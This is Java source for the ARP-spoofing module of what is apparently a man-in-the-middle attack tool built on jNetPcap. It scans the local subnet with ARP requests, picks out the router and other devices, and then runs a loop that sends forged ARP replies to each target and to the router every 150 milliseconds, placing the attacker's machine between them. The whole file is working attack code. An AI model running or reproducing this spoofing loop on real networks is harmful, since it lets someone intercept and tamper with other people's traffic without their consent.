package com.SHGroup.mitm.networking;

import java.net.Inet4Address;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Enumeration;

import org.jnetpcap.Pcap;

import com.SHGroup.mitm.Main;
import com.SHGroup.mitm.Utils;
import com.SHGroup.mitm.networking.packets.ARPPacket;

public class ARPSpoofing {
	private byte[] localIP = null;
	private byte[] localMac = null;

	private byte[] routerIP = null;
	private byte[] routerMac = null;

	private boolean isSet = false;

	private ArrayList<Device> targets = new ArrayList<>();

	private ReplyThread t;

	public ARPSpoofing() {
	}

	public void onExit() {
		if (t != null)
			t.stopRun();
	}

	public void initArpSpoofing() {
		try {
			localMac = Main.network.getDevice().getHardwareAddress();

			// ip auto detect..
			// hard coding xD
			Enumeration<NetworkInterface> e = NetworkInterface.getNetworkInterfaces();
			while (e.hasMoreElements()) {
				NetworkInterface n = (NetworkInterface) e.nextElement();
				if (n.getHardwareAddress() != null
						&& Utils.bytesToString(n.getHardwareAddress()).equals(Utils.bytesToString(localMac))) {
					Enumeration<InetAddress> ee = n.getInetAddresses();
					while (ee.hasMoreElements()) {
						InetAddress inet = (InetAddress) ee.nextElement();
						if (inet instanceof Inet4Address) {
							Main.gui.appendLog("IP auto detect : " + inet.getHostAddress());
							localIP = inet.getAddress();
							routerIP = new byte[] { localIP[0], localIP[1], localIP[2], 1 };
						}
					}
				}
			}
			sendARPRequest();

			t = new ReplyThread();
			t.setDaemon(true);
			t.start();
			isSet = true;
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	private Device router;

	public Device getRouter() {
		if (routerIP != null) {
			if (router == null) {
				router = new Device(routerMac, routerIP);
			} else {
				if (!Utils.bytesToString(router.getMac()).equals(Utils.bytesToString(router.getMac()))) {
					router = new Device(routerMac, routerIP);
				}
			}
		}
		return router;
	}

	public void addTarget(Device d) {
		if (!targets.contains(d)) {
			targets.add(d);
			Main.gui.appendLog("ARP 스푸핑 타겟이 추가되었습니다. : " + d.getNickName());
		}
	}

	public void responseARPReply(ARPPacket arp) {
		if (arp.getOpcode()[0] == 0x00 && arp.getOpcode()[1] == 0x02) { // reply packet
			if (Utils.bytesToString(arp.getSenderMac()).equals(Utils.bytesToString(localMac))) {
				Main.gui.appendLog(
						"Send reply packet (to " + Utils.getIPandMACToString(arp.getTargetIP(), arp.getTargetMac()));
				return;
			}
			if (arp.getSenderIP()[3] == 1) {
				routerIP = arp.getSenderIP();
				routerMac = arp.getSenderMac();

				Main.gui.appendLog("Detect router! : " + Utils.getIPandMACToString(routerIP, routerMac));
			} else {
				Device d = new Device(arp.getSenderMac(), arp.getSenderIP());

				int res = Main.network.addDevice(d);
				if (res != -1) {
					Main.gui.getController().loadARPTargetDevices();
					Main.gui.appendLog("Detect device! : " + d.getNickName());
				} else {
					Main.gui.appendLog("Add device failed... : "
							+ Utils.getIPandMACToString(arp.getSenderIP(), arp.getSenderMac()));
				}
			}
		}
	}

	public void sendARPRequest() {
		try {

			// hard coding broadcasting.. haha
			// some hard coding makes speed faster

			for (int i = 1; i < 256; i++) {
				byte[] target = new byte[] { localIP[0], localIP[1], localIP[2], (byte) i };
				if (i == localIP[3]) {
					Main.gui.appendLog("Not send arp request to " + Utils.IPToString(target) + " because it is me..");
					continue;
				}
				ARPPacket arp = ARPPacket.generateARPRequstPacket(localMac, localIP, target);

				int isOk = Main.network.getPcap().sendPacket(arp.generatePacket());
				if (isOk != Pcap.OK) {
					Main.gui.appendLog("Error on broadcasting..");
					Main.gui.appendLog(" Cause : " + Main.network.getPcap().getErr());
					continue;
				}
				if (i % 50 == 0)
					Main.gui.appendLog("Send arp request (now : " + Utils.IPToString(target) + ")");
			}
			Main.gui.appendLog("Send arp request finish ( 1 ~ 255 )");
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public boolean isSet() {
		return isSet;
	}

	private class ReplyThread extends Thread {
		private boolean isExit = false;

		@Override
		public void run() {
			while (!isExit) {
				try {
					if (Main.network.getPcap() != null) {
						for (Device d : targets) {
							ARPPacket arp = ARPPacket.generateARPReplyPacket(d.getMac(), localMac, localMac, routerIP,
									d.getMac(), d.getIP());
							ARPPacket arp2 = ARPPacket.generateARPReplyPacket(routerMac, localMac, localMac, d.getIP(),
									routerMac, routerIP);
							Main.network.getPcap().sendPacket(arp2.generatePacket());
							Main.network.getPcap().sendPacket(arp.generatePacket());
						}
						Thread.sleep(150l);
					}
				} catch (Exception ex) {
					ex.printStackTrace();
				}
			}
		}

		public void stopRun() {
			this.isExit = true;
		}
	}
}
